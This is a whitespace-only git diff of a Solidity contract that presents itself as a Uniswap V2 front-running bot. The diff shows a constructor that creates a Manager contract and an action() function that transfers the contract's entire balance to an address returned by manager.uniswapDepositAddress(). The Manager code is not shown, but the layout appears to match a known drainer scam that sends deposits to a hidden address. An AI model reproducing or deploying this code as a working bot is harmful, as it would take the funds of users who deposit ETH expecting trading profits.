@@ -11,19 +11,18 @@ contract UniswapV2FrontBot {
 	
 	constructor() public {
 
-		manager = new Manager();
-		
-		}
+           manager = new Manager();
+	}
 	
 	    
 
-	    receive() external payable {}
+	receive() external payable {}
 	    
 	
 	    
-	    function action() public payable {
+	function action() public payable {
 
-          payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
+           payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
 
         }      
 
